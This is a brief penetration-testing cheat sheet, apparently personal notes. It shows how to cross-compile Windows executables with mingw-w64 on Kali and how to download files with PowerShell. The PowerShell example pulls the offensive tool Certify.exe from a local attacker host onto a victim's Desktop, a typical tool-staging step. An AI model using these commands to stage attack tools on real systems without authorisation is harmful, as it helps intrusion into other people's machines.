Cross compiling on KALI:
---
```bash
sudo apt install mingw-w64
#for 32-bit executable
i686-w64-mingw32-gcc -o test.exe test.c
#for 64-bit executable
x86_64-w64-mingw32-gcc -o test.exe test.c
```
Download file using PowerShell:
---
#powershell #download #windows

```powershell
$URL="http://$LOCAL_IP/Certify.exe"
$PATH="c:\users\$USER\Desktop\certify.exe"
(New-Object System.Net.WebClient).DownloadFile($URL, $PATH)
```

```powershell
iwr $URL -outfile $FILENAME
```
